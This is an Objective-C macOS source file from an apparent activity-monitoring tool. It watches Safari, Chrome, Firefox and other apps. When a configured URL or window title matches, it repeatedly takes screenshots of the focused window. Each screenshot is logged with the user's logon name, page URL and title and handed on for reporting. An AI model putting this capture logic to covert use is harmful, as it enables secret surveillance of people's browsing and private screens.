//
//  AppScreenShot.m
//  AppScreenShotManager
//
//  Created by ophat on 4/1/16.
//  Copyright (c) 2016 ophat. All rights reserved.
//

#import "AppScreenShot.h"
#import "AppScreenRule.h"

#import "Firefox.h"
#import "FirefoxUrlInfoInquirer.h"
#import "SystemUtilsImpl.h"
#import "ImageUtils.h"

#import "FxAppScreenShotEvent.h"
#import "DateTimeFormat.h"
#import "DefStd.h"

NSString * kAppScreenShotSafariBundleID         = @"com.apple.Safari";
NSString * kAppScreenShotFirefoxBundleID        = @"org.mozilla.firefox";
NSString * kAppScreenShotGoogleChromeBundleID   = @"com.google.Chrome";

const int kAppDeactive      = 0;
const int kAppActive        = 1;
const int kAppChangeTitle   = 2;
const int kAppTerminate     = 3;

@implementation AppScreenShot

@synthesize mSavePath;
@synthesize mSnapShotTimer;
@synthesize mSnapAppID, mSnapAppName, mSnapAppUrl, mSnapAppTitle, mSnapAppType;
@synthesize mSnapRuleTitle, mSnapRuleUrl;
@synthesize mThread;
@synthesize mDelegate,mSelector;

- (instancetype) init {
    if (self = [super init]) {
        mRules = [[NSMutableArray alloc] init];
        mListOfApplication = [[NSMutableArray alloc] init];
        mFirefoxURLDetector = [[FirefoxUrlInfoInquirer alloc] init];
    }
    return self;
}

- (void) addRule:(AppScreenRule *) aRule {
    if ([aRule mAppType] == kBrowser && ([[aRule mApplicationID] isEqualToString:kAppScreenShotSafariBundleID])) {
        mIsContainSafariSnapShot = YES;
    } else if ([aRule mAppType] == kBrowser && ([[aRule mApplicationID] isEqualToString:kAppScreenShotGoogleChromeBundleID])) {
        mIsContainChromeSnapShot = YES;
    } else if ([aRule mAppType] == kBrowser && ([[aRule mApplicationID] isEqualToString:kAppScreenShotFirefoxBundleID])) {
        mIsContainFirefoxSnapShot = YES;
    }

    [mListOfApplication addObject:[aRule mApplicationID]];
    [mRules addObject:aRule];
}

- (void) clearRules {
    mIsContainSafariSnapShot = NO;
    mIsContainChromeSnapShot = NO;
    mIsContainFirefoxSnapShot = NO;
    
    self.mSnapRuleTitle = nil;
    self.mSnapRuleUrl   = nil;
    
    [mListOfApplication removeAllObjects];
    [mRules removeAllObjects];
}

- (void) startCapture {
    DLog(@"#### AppScreenShot startCapture");
    if ([mRules count] > 0) {
        [self registerNotification];
    } else{
        DLog(@"No Rule No Go");
    }
}

- (void) stopCapture {
    DLog(@"#### AppScreenShot stopCapture");
    [self unregisterNotification];
    
    if (mSnapShotTimer) {
        [mSnapShotTimer invalidate];
        mSnapShotTimer = nil;
    }
    
    [self clearRules];
}

- (void) registerNotification {
    [self unregisterNotification];

    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(appNotifyCaseActive:)  name:NSWorkspaceDidActivateApplicationNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(appNotifyCaseDeactive:)  name:NSWorkspaceDidDeactivateApplicationNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(appNotifyCaseLaunch:)  name:NSWorkspaceDidLaunchApplicationNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(appNotifyCaseTerminate:)  name:NSWorkspaceDidTerminateApplicationNotification  object:nil];
}

- (void) unregisterNotification {
    [[[NSWorkspace sharedWorkspace] notificationCenter] removeObserver:self name:NSWorkspaceDidActivateApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] removeObserver:self name:NSWorkspaceDidDeactivateApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] removeObserver:self name:NSWorkspaceDidLaunchApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] removeObserver:self name:NSWorkspaceDidTerminateApplicationNotification object:nil];
    
    [self unRegisterPageEventSafari];
    [self unRegisterPageEventFirefox];
    [self unRegisterPageEventChrome];
}

- (void) appNotifyCaseLaunch:(NSNotification *) notification {
    // DO NOTHING
}

- (void) appNotifyCaseActive:(NSNotification *) notification {
    NSDictionary *userInfo = [notification userInfo];
    NSRunningApplication * runningapp = [userInfo objectForKey:[[userInfo allKeys]objectAtIndex:0]];
    
    BOOL isBrowserApp = NO;
    if (mIsContainSafariSnapShot) {
        if ([[runningapp bundleIdentifier]isEqualToString:kAppScreenShotSafariBundleID]) {
            [self registerPageEventSafari];
            [self appScreenShotTitleChangeCallBack];
            isBrowserApp = YES;
        }
    }
    
    if (mIsContainChromeSnapShot) {
        if ([[runningapp bundleIdentifier]isEqualToString:kAppScreenShotGoogleChromeBundleID]) {
            [self registerPageEventChrome];
            [self appScreenShotTitleChangeCallBack];
            isBrowserApp = YES;
        }
    }
    
    if (mIsContainFirefoxSnapShot) {
        if ([[runningapp bundleIdentifier]isEqualToString:kAppScreenShotFirefoxBundleID]) {
            [self registerPageEventFirefox];
            [self appScreenShotTitleChangeCallBack];
            isBrowserApp = YES;
        }
    }
    
    if (!isBrowserApp) {
        [self validateToSnapForURL:nil appID:[runningapp bundleIdentifier] action:kAppActive];
    }
}

- (void) appNotifyCaseDeactive:(NSNotification *) notification {
    NSDictionary *userInfo = [notification userInfo];
    NSRunningApplication *runningapp = [userInfo objectForKey:[[userInfo allKeys]objectAtIndex:0]];
    
    if (mIsContainSafariSnapShot) {
        if ([[runningapp bundleIdentifier]isEqualToString:kAppScreenShotSafariBundleID]) {
            [self unRegisterPageEventSafari];
        }
    }
    
    if (mIsContainChromeSnapShot) {
        if ([[runningapp bundleIdentifier]isEqualToString:kAppScreenShotGoogleChromeBundleID]) {
            [self unRegisterPageEventChrome];
        }
    }
    
    if (mIsContainFirefoxSnapShot) {
        if ([[runningapp bundleIdentifier]isEqualToString:kAppScreenShotFirefoxBundleID]) {
            [self unRegisterPageEventFirefox];
        }
    }
    
    [self validateToSnapForURL:nil appID:[runningapp bundleIdentifier] action:kAppDeactive];
}

-(void) appNotifyCaseTerminate:(NSNotification *) notification{
    NSDictionary *userInfo = [notification userInfo];
    NSString * appBundleIdentifier = [userInfo objectForKey:@"NSApplicationBundleIdentifier"];
    if (mIsContainSafariSnapShot) {
        if ([appBundleIdentifier isEqualToString:kAppScreenShotSafariBundleID]) {
            [self unRegisterPageEventSafari];
        }
    }
    
    if (mIsContainChromeSnapShot) {
        if([appBundleIdentifier isEqualToString:kAppScreenShotGoogleChromeBundleID]) {
            [self unRegisterPageEventChrome];
        }
    }
    
    if (mIsContainFirefoxSnapShot) {
        if ([appBundleIdentifier isEqualToString:kAppScreenShotFirefoxBundleID]) {
            [self unRegisterPageEventFirefox];
        }
    }
    
    [self validateToSnapForURL:nil appID:appBundleIdentifier action:kAppTerminate];
}

- (void) registerPageEventSafari {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        if (mProcess1 == nil && mObserver1 == nil) {
            pid_t pid = [self getPID:@"Safari"];
            DLog(@"Safari pid : %d", pid);
            
            mProcess1 = AXUIElementCreateApplication(pid);
            AXObserverCreate(pid, appScreenShot_AXObserverCallback, &mObserver1);
            
            if ([SystemUtilsImpl isOSX_VersionEqualOrGreaterMajorVersion:10 minorVersion:10]) {
                //DLog(@"GreaterOrEqual isOSX_10_10");
                AXObserverAddNotification(mObserver1, mProcess1, CFSTR("AXTitleChanged"), self);
            } else if ([SystemUtilsImpl isOSX_10_9]) {
                //DLog(@"isOSX_10_9");
                AXObserverAddNotification(mObserver1, mProcess1, CFSTR("AXValueChanged"), self);
            }
            
            CFRunLoopAddSource(CFRunLoopGetCurrent(), AXObserverGetRunLoopSource(mObserver1), kCFRunLoopDefaultMode);
            DLog(@"registerPageEvent Safari");
        }
    });
}

- (void) registerPageEventChrome {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        if (mProcess2 == nil && mObserver2 == nil) {
            pid_t pid = [self getPID:@"Google Chrome"];
            DLog(@"Google Chrome pid : %d", pid);
            
            mProcess2 = AXUIElementCreateApplication(pid);
            AXObserverCreate(pid, appScreenShot_AXObserverCallback, &mObserver2);
            AXObserverAddNotification(mObserver2, mProcess2, CFSTR("AXTitleChanged"), self);
            CFRunLoopAddSource(CFRunLoopGetCurrent(), AXObserverGetRunLoopSource(mObserver2), kCFRunLoopDefaultMode);
            DLog(@"registerPageEvent Google Chrome");
        }
    });
}

-(void) registerPageEventFirefox {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        if (mProcess3 == nil && mObserver3 == nil) {
            pid_t pid = [self getPID:@"firefox"];
            DLog(@"Firefox pid : %d", pid);
            
            mProcess3 = AXUIElementCreateApplication(pid);
            AXObserverCreate(pid, appScreenShot_AXObserverCallback, &mObserver3);
            AXObserverAddNotification(mObserver3, mProcess3, CFSTR("AXTitleChanged"), self);
            CFRunLoopAddSource(CFRunLoopGetCurrent(), AXObserverGetRunLoopSource(mObserver3), kCFRunLoopDefaultMode);
            DLog(@"registerPageEvent Firefox");
        }
    });
}

- (void) unRegisterPageEventSafari {
    if (mProcess1 != nil && mObserver1 != nil) {
        DLog(@"unRegisterPageEventSafari");
        
        if ([SystemUtilsImpl isOSX_VersionEqualOrGreaterMajorVersion:10 minorVersion:10]) {
            //DLog(@"GreaterOrEqual isOSX_10_10");
            AXObserverRemoveNotification(mObserver1, mProcess1, CFSTR("AXTitleChanged"));
        } else if ([SystemUtilsImpl isOSX_10_9]) {
            //DLog(@"isOSX_10_9");
            AXObserverRemoveNotification(mObserver1, mProcess1, CFSTR("AXValueChanged"));
        }
        
        CFRunLoopRemoveSource(CFRunLoopGetCurrent(), AXObserverGetRunLoopSource(mObserver1), kCFRunLoopDefaultMode);
        
        CFRelease(mObserver1);
        CFRelease(mProcess1);
        
        mObserver1 = nil;
        mProcess1 = nil;
    }
}

- (void) unRegisterPageEventChrome {
    if (mProcess2 != nil && mObserver2 != nil) {
        DLog(@"unRegisterPageEventChrome");
        AXObserverRemoveNotification(mObserver2, mProcess2, CFSTR("AXTitleChanged"));
        CFRunLoopRemoveSource(CFRunLoopGetCurrent(), AXObserverGetRunLoopSource(mObserver2), kCFRunLoopDefaultMode);
        
        CFRelease(mObserver2);
        CFRelease(mProcess2);
        
        mObserver2 = nil;
        mProcess2 = nil;
    }
}

- (void) unRegisterPageEventFirefox {
    if (mObserver3 != nil && mProcess3 != nil) {
        DLog(@"unRegisterPageEventFirefox");
        AXObserverRemoveNotification(mObserver3, mProcess3, CFSTR("AXTitleChanged") );
        CFRunLoopRemoveSource(CFRunLoopGetCurrent(), AXObserverGetRunLoopSource(mObserver3), kCFRunLoopDefaultMode);
        
        CFRelease(mObserver3);
        CFRelease(mProcess3);
        
        mObserver3 = nil;
        mProcess3 = nil;
    }
}

- (int) getPID: (NSString *) aProcessName {
    int pid = 0;
    SystemUtilsImpl *systemUtils = [[[SystemUtilsImpl alloc] init] autorelease];
    NSArray *runningApps = [systemUtils getRunnigProcess];
    for (NSDictionary *pInfo in runningApps) {
        if ([[pInfo objectForKey:kRunningProcessNameTag] isEqualToString:aProcessName]) {
            pid = [(NSString *)[pInfo objectForKey:kRunningProcessIDTag] intValue];
            break;
        }
    }
    return pid;
}

void appScreenShot_AXObserverCallback( AXObserverRef observer, AXUIElementRef element, CFStringRef notificationName, void * contextData) {
    CFTypeRef _title = nil;
    if (AXUIElementCopyAttributeValue(element, (CFStringRef)NSAccessibilityTitleAttribute, (CFTypeRef *)&_title) == kAXErrorSuccess) {
        NSString *title = (NSString *)_title;
        if ([title length] > 0) {
            AppScreenShot *myself = (AppScreenShot *)contextData;
            [myself appScreenShotTitleChangeCallBack];
        }
    }
    
    if (_title != nil){
        CFRelease(_title);
    }
}

- (void) appScreenShotTitleChangeCallBack {
    @try {
        NSRunningApplication *frontmostApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
        
        if ([frontmostApp.bundleIdentifier isEqualToString:kAppScreenShotSafariBundleID]) {
            NSAppleScript *scpt = [[NSAppleScript alloc] initWithSource:@"tell application \"Safari\" \n return{ URL of current tab of window 1,name of current tab of window 1} \n end tell"];
            NSDictionary *error = nil;
            NSAppleEventDescriptor *scptResult = [scpt executeAndReturnError:&error];
            if (!error) {
                [self validateToSnapForURL:[[scptResult descriptorAtIndex:1] stringValue] appID:kAppScreenShotSafariBundleID action:kAppChangeTitle];
            }
            [scpt release];
        }
        
        if ([frontmostApp.bundleIdentifier isEqualToString:kAppScreenShotGoogleChromeBundleID]) {
            NSAppleScript *scpt = [[NSAppleScript alloc] initWithSource:@"tell application \"Google Chrome\" to return {URL of active tab of front window, title of active tab of front window}"];
            NSDictionary *error = nil;
            NSAppleEventDescriptor *scptResult = [scpt executeAndReturnError:&error];
            if (!error) {
                [self validateToSnapForURL:[[scptResult descriptorAtIndex:1] stringValue] appID:kAppScreenShotGoogleChromeBundleID action:kAppChangeTitle];
            }
            [scpt release];
        }
        
        if ([frontmostApp.bundleIdentifier isEqualToString:kAppScreenShotFirefoxBundleID]) {
            @try {
                FirefoxApplication *firefoxApp = [SBApplication applicationWithBundleIdentifier:kAppScreenShotFirefoxBundleID];
                NSString *title = [[[[firefoxApp windows] get] firstObject] name];
                NSString *url = [mFirefoxURLDetector urlWithTitle:title];
                if (url) {
                    [self validateToSnapForURL:url appID:kAppScreenShotFirefoxBundleID action:kAppChangeTitle];
                }
                else {
                    NSDictionary *urlInfo = [mFirefoxURLDetector lastUrlInfo];
                    title = [urlInfo objectForKey:@"title"];
                    url = [urlInfo objectForKey:@"url"];
                    if (url) {
                        [self validateToSnapForURL:url appID:kAppScreenShotFirefoxBundleID action:kAppChangeTitle];
                    }
                }
            }
            @catch (NSException *e) {
                DLog(@"------> AppScreenShot Firefox url, title exception : %@", e);
            }
            @catch (...) {
                DLog(@"------> AppScreenShot Firefox url, title unknow exception...");
            }
        }
    } @catch (NSException *exception){
        DLog(@"### AppScreenShot exception : %@",exception);
    }
}

- (NSString *) getTitleOfWindowFromAppID:(NSString *) aAppID {
    NSRunningApplication *rApp = [[NSRunningApplication runningApplicationsWithBundleIdentifier:aAppID] firstObject];
    return [SystemUtilsImpl frontApplicationWindowTitleWithPID:[NSNumber numberWithInt:rApp.processIdentifier]];
}

- (NSString *) getUrlOfAppID: (NSString *) aAppID {
    NSString *url = nil;
    
    @try {
        if ([aAppID isEqualToString:kAppScreenShotSafariBundleID]) {
            NSAppleScript *scpt = [[NSAppleScript alloc] initWithSource:@"tell application \"Safari\" \n return{ URL of current tab of window 1,name of current tab of window 1} \n end tell"];
            NSDictionary *error = nil;
            NSAppleEventDescriptor *scptResult = [scpt executeAndReturnError:&error];
            if (!error) {
                url = [[scptResult descriptorAtIndex:1] stringValue];
            }
            [scpt release];
        }
        
        if ([aAppID isEqualToString:kAppScreenShotGoogleChromeBundleID]) {
            NSAppleScript *scpt = [[NSAppleScript alloc] initWithSource:@"tell application \"Google Chrome\" to return {URL of active tab of front window, title of active tab of front window}"];
            NSDictionary *error = nil;
            NSAppleEventDescriptor *scptResult = [scpt executeAndReturnError:&error];
            if (!error) {
                url = [[scptResult descriptorAtIndex:1] stringValue];
            }
            [scpt release];
        }
        
        if ([aAppID isEqualToString:kAppScreenShotFirefoxBundleID]) {
            FirefoxApplication *firefoxApp = [SBApplication applicationWithBundleIdentifier:kAppScreenShotFirefoxBundleID];
            NSString *title = [[[[firefoxApp windows] get] firstObject] name];
            url = [mFirefoxURLDetector urlWithTitle:title];
            if (!url) {
                NSDictionary *urlInfo = [mFirefoxURLDetector lastUrlInfo];
                title = [urlInfo objectForKey:@"title"];
                url = [urlInfo objectForKey:@"url"];
            }
        }
    } @catch (NSException *exception){
        DLog(@"### AppScreenShot exception : %@",exception);
    }
    
    return url;
}

- (void) validateToSnapForURL:(NSString *) aUrl appID:(NSString *) aAppID action:(int) aAction {
    if ([mListOfApplication containsObject:aAppID]) {
        
        if (aAction == kAppActive || aAction == kAppChangeTitle) {
            
            NSString * appTitle = [self getTitleOfWindowFromAppID:aAppID];
            NSString * appName  = [[[NSRunningApplication runningApplicationsWithBundleIdentifier:aAppID] firstObject] localizedName];
            
            DLog(@"aAppID : %@, appName : %@, appTitle : %@, aUrl : %@, action : %d",aAppID, appName, appTitle, aUrl, aAction);
            
            AppScreenRule *rule = nil;
            for (AppScreenRule *r in mRules) {
                if ([[r mApplicationID] isEqualToString:aAppID]) {
                    rule = r;
                    break;
                }
            }
            
            DLog(@"Matched rule (by app) : %@", rule);
            if (rule) {
                if (rule.mAppType == kBrowser) { // Rule for browser
                    DLog(@"### Browser");
                    BOOL noRuleMatched = YES;
                    for (AppScreenParameter *parameter in rule.mParameter) {
                        if ([aUrl rangeOfString:parameter.mDomainName].location != NSNotFound) {
                            noRuleMatched = NO;
                            
                            DLog(@"Match url");
                            
                            if (self.mSnapShotTimer) {
                                [self.mSnapShotTimer invalidate];
                                self.mSnapShotTimer = nil;
                            }
                            self.mSnapAppID    = aAppID;
                            self.mSnapAppName  = appName;
                            self.mSnapAppTitle = appTitle;
                            self.mSnapAppUrl   = aUrl;
                            self.mSnapAppType  = kBrowser;
                            
                            self.mSnapRuleTitle = nil;
                            self.mSnapRuleUrl   = parameter.mDomainName;
                            
                            //DLog(@"Snap every %d unit of time", rule.mFrequency);
                            self.mSnapShotTimer = [NSTimer scheduledTimerWithTimeInterval:[rule mFrequency] target:self selector:@selector(snapAndSend) userInfo:nil repeats:YES];
                            [mSnapShotTimer fire]; // Yolo Start
                            
                            break;
                        }
                        else if ([appTitle rangeOfString:parameter.mTitle].location != NSNotFound) {
                            noRuleMatched = NO;
                            
                            DLog(@"Match title");
                            
                            if (self.mSnapShotTimer) {
                                [self.mSnapShotTimer invalidate];
                                self.mSnapShotTimer = nil;
                            }
                            self.mSnapAppID    = aAppID;
                            self.mSnapAppName  = appName;
                            self.mSnapAppTitle = appTitle;
                            self.mSnapAppUrl   = aUrl;
                            self.mSnapAppType  = kBrowser;
                            
                            self.mSnapRuleTitle = parameter.mTitle;
                            self.mSnapRuleUrl   = nil;
                            
                            //DLog(@"Snap every %d unit of time", rule.mFrequency);
                            self.mSnapShotTimer = [NSTimer scheduledTimerWithTimeInterval:rule.mFrequency target:self selector:@selector(snapAndSend) userInfo:nil repeats:YES];
                            [mSnapShotTimer fire]; // Yolo Start
                            
                            break;
                        }
                    }
                    
                    if (noRuleMatched) {
                        if (self.mSnapShotTimer) {
                            DLog(@"No match, end snap for, app: %@, url : %@, title : %@", self.mSnapAppID, self.mSnapAppUrl, self.mSnapAppTitle);
                            [self.mSnapShotTimer invalidate];
                            self.mSnapShotTimer = nil;
                        }
                        
                        self.mSnapAppID    = nil;
                        self.mSnapAppName  = nil;
                        self.mSnapAppTitle = nil;
                        self.mSnapAppUrl   = nil;
                        self.mSnapAppType  = kBrowser;
                        
                        self.mSnapRuleTitle = nil;
                        self.mSnapRuleUrl   = nil;
                    }
                }
                else if (rule.mAppType == kNon_Browser) { // Rule for non-browser
                    DLog(@"### Non-Browser");
                    BOOL isTitleMatched = NO;
                    for (AppScreenParameter *parameter in rule.mParameter) {
                        if ([appTitle rangeOfString:parameter.mTitle].location != NSNotFound) {
                            isTitleMatched = YES;
                            
                            self.mSnapRuleTitle = parameter.mTitle;
                            self.mSnapRuleUrl   = nil;
                            
                            break;
                        }
                    }
                    
                    if (isTitleMatched) {
                        DLog(@"Match title");
                        
                        if (self.mSnapShotTimer) {
                            [self.mSnapShotTimer invalidate];
                            self.mSnapShotTimer = nil;
                        }
                        self.mSnapAppID    = aAppID;
                        self.mSnapAppName  = appName;
                        self.mSnapAppTitle = appTitle;
                        self.mSnapAppUrl   = nil;
                        self.mSnapAppType  = kNon_Browser;
                        
                        //DLog(@"Snap every %d unit of time", rule.mFrequency);
                        self.mSnapShotTimer = [NSTimer scheduledTimerWithTimeInterval:rule.mFrequency target:self selector:@selector(snapAndSend) userInfo:nil repeats:YES];
                        [mSnapShotTimer fire]; // Yolo Start
                    }
                    else {
                        if (self.mSnapShotTimer) {
                            DLog(@"No match, end snap for, app: %@, title : %@", self.mSnapAppID, self.mSnapAppTitle);
                            [self.mSnapShotTimer invalidate];
                            self.mSnapShotTimer = nil;
                        }
                        
                        self.mSnapAppID    = nil;
                        self.mSnapAppName  = nil;
                        self.mSnapAppTitle = nil;
                        self.mSnapAppUrl   = nil;
                        self.mSnapAppType  = kNon_Browser;
                        
                        self.mSnapRuleTitle = nil;
                        self.mSnapRuleUrl   = nil;
                    }
                }
            }
        }
        else if (aAction == kAppDeactive || aAction == kAppTerminate) {
            if (self.mSnapShotTimer) {
                DLog(@"Deactivate or terminate, end snap for, app: %@", self.mSnapAppID);
                [self.mSnapShotTimer invalidate];
                self.mSnapShotTimer = nil;
            }
            
            self.mSnapAppID    = nil;
            self.mSnapAppName  = nil;
            self.mSnapAppTitle = nil;
            self.mSnapAppUrl   = nil;
            self.mSnapAppType  = kBrowser;
            
            self.mSnapRuleTitle = nil;
            self.mSnapRuleUrl   = nil;
        }
    }
}

- (void) snapAndSend {
    NSRunningApplication *frontmostApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
    if ([self.mDelegate respondsToSelector:self.mSelector] && [frontmostApp.bundleIdentifier isEqualToString:self.mSnapAppID]) {
        
        /*
         For situation where user switch tabs (e.g: Chrome) but the notification did not trigger so application takes screenshot of wrong widnow like url is gmail but screenshot is redmine
         */
        
        bool nothingChange = true;
        if (self.mSnapRuleTitle) {
            // Match by title thus compare title again
            NSString *title = [self getTitleOfWindowFromAppID:self.mSnapAppID];
            if ([title rangeOfString:self.mSnapAppTitle].location == NSNotFound) {
                nothingChange = false;
            } else {
                // Nothing change or something change but title remain matched, update title to reflect the screenshot
                self.mSnapAppTitle = title;
            }
        }
        
        if (self.mSnapRuleUrl) {
            // Match by url thus compare url again
            NSString *url = [self getUrlOfAppID:self.mSnapAppID];
            if ([url rangeOfString:self.mSnapAppUrl].location == NSNotFound) {
                nothingChange = false;
            } else {
                // Nothing change or something change but url remain matched, update url to reflect the screenshot
                self.mSnapAppUrl = url;
            }
        }
        
        if (nothingChange) {
            dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
                NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

                //NSImage *screenshot = [SystemUtilsImpl takeScreenshotFrontWindowWithBundleIDUsingAppleScript:self.mSnapAppID];
                NSImage *screenshot = [SystemUtilsImpl takeFocusedWindowShotWithBundleID:self.mSnapAppID];
                
                //NSSize reSize = NSMakeSize(850.0f,850.0f);
                //screenshot = [ImageUtils scaleImage:screenshot toSize:reSize];
                screenshot = [ImageUtils imageToGreyImage:screenshot];
                if (screenshot) {
                    NSData *tiffData = [screenshot TIFFRepresentation];
                    NSBitmapImageRep *bitmap = [NSBitmapImageRep imageRepWithData:tiffData];
                    [bitmap setSize:[screenshot size]];
                    NSData *pngData = [bitmap representationUsingType:NSPNGFileType properties:nil];
                    NSString * savePath = [NSString stringWithFormat:@"%@%@.png",self.mSavePath,[NSDate date]];
                    [pngData writeToFile:savePath atomically:YES];
     
                    FxAppScreenShotEvent *ASSEvent = [[FxAppScreenShotEvent alloc] init];
                    [ASSEvent setDateTime:[DateTimeFormat phoenixDateTime]];
                    [ASSEvent setMUserLogonName:[SystemUtilsImpl userLogonName]];
                    [ASSEvent setMApplicationID:self.mSnapAppID];
                    [ASSEvent setMApplicationName:self.mSnapAppName];
                    [ASSEvent setMTitle:self.mSnapAppTitle];
                    [ASSEvent setMApplication_Catagory:self.mSnapAppType];
                    [ASSEvent setMUrl:self.mSnapAppUrl];
                    [ASSEvent setMScreenshotFilePath:savePath];
                    /*
                    DLog(@"===================== snapAndSend =======================");
                    DLog(@"dateTime: %@", [ASSEvent dateTime]);
                    DLog(@"mUserLogonName: %@", [ASSEvent mUserLogonName]);
                    DLog(@"mApplicationID: %@", [ASSEvent mApplicationID]);
                    DLog(@"mApplicationName: %@", [ASSEvent mApplicationName]);
                    DLog(@"mTitle: %@", [ASSEvent mTitle]);
                    DLog(@"mApplication_Catagory ID: %d", (int)[ASSEvent mApplication_Catagory]);
                    DLog(@"mUrl: %@", [ASSEvent mUrl]);
                    DLog(@"mScreenshotFilePath: %@", [ASSEvent mScreenshotFilePath]);
                    DLog(@"===================== snapAndSend =======================");
                    
                    NSFileManager *fileManager = [NSFileManager defaultManager];
                    NSDictionary *fileAttr = [fileManager attributesOfItemAtPath:savePath error:nil];
                    unsigned long long pngFileSize = [fileAttr fileSize];
                    DLog(@"Screen shot file size : %llu kb", pngFileSize/1024);*/
                    
                    // ID, Name, Title, Url could reset in another thread (main) so make sure some of these contain value by checking only ID
                    if (ASSEvent.mApplicationID != nil) {
                        [mDelegate performSelector:self.mSelector onThread:self.mThread withObject:ASSEvent waitUntilDone:NO];
                    }
                    [ASSEvent release];
                    
                } else {
                    DLog(@"No Send :> CANNOT take screenshot self.mSnapAppID : %@", self.mSnapAppID);
                }
                [pool release];
            });
        }
    }
}

-(void) dealloc{
    [self stopCapture];
    
    [mSavePath release];
    [mListOfApplication release];
    [mRules release];
    [mSnapShotTimer invalidate];
    [mSnapShotTimer release];
    
    [mSnapAppID release];
    [mSnapAppName release];
    [mSnapAppTitle release];
    [mSnapAppUrl release];
    
    [mSnapRuleTitle release];
    [mSnapRuleUrl release];
    
    [mFirefoxURLDetector release];
    
    [super dealloc];
}

@end
